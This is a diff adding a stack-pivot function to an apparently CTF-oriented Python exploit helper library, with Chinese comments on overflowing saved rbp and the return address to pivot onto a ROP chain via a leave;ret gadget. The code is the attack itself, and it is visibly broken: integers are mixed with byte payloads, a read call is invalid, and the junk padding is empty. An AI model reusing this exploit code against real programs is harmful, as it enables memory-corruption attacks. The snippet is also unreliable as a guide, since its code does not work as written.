@@ -116,4 +116,28 @@ def ret2csu(csu_end_addr:int, csu_start_addr:int, ret_addr:int,
     print("len of payload:{}".format(payload))
     io.send(payload)
     
+  
+def stack_pivot_attack(io, elf, leave_ret_addr:int, fake_rbp_addr:int):
+    '''
+    栈迁移：程序溢出的字节数为两个指针大小，只能覆盖到函数返回地址
+    将栈迁移到其他可写入的地方，如bss段，data段，libc的free_hook上方
+    需要寻找一个leave;ret的gadget, 这里以64位为例
+    
+    '''  
+    # 第一步是往fake_rbp_addr写入rop链
+    payload = fake_rbp_addr + 0x200 # fake rbp 2
+    payload += 0x0 # 这里开始，可以填写真正的rop链，如要执行的函数地址等
+    # ......
+    io.read(0, fake_rbp_addr, 0x60) # 触发某写入函数，往地址里面写入ROP
+    
+    # 第二步是控制栈溢出
+    payload = 0x0 * b'a' # junk data
+    payload += p64(fake_rbp_addr) # 填充rbp
+    payload += p64(leave_ret_addr) # 填充返回地址
+    io.send(payload)
+    
+    # 之后，程序会取执行rop链
+    
+    
+    
     
